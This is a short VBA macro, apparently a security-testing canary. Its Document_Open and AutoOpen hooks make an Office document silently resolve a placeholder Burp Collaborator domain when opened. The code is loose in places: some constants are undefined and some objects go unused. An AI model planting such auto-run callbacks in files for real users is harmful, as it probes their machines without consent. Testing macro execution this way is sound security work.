Private Declare PtrSafe Function DnsQuery_A Lib "dnsapi.dll" ( _
    ByVal hostname As String, _
    ByVal wType As Integer, _
    ByVal Options As Long, _
    ByVal Extra As Long, _
    ppQueryResultsSet As Long, _
    ByVal Reserved As Long _
) As Long

Sub Document_Open()
    dns
End Sub

Sub AutoOpen()
    dns
End Sub

Sub dns()
    ' This will generate a DNS lookup and trip your collaborator token
    Dim objWSH: Set objWSH = CreateObject("WScript.Shell")
    Dim objDNSAPI: Set objDNSAPI = CreateObject("Scripting.Dictionary")
    objDNSAPI.CompareMode = vbBinaryCompare
    Dim pQueryResults: pQueryResults = 0
    Dim result: result = DnsQuery_A("123456abcde.burpcollab.com", DNS_TYPE_A, DNS_QUERY_STANDARD, 0, pQueryResults, 0)
    If result = 0 Then
        DNSLookup = pQueryResults
    Else
        DNSLookup = "Error: " & result
    End If
End Sub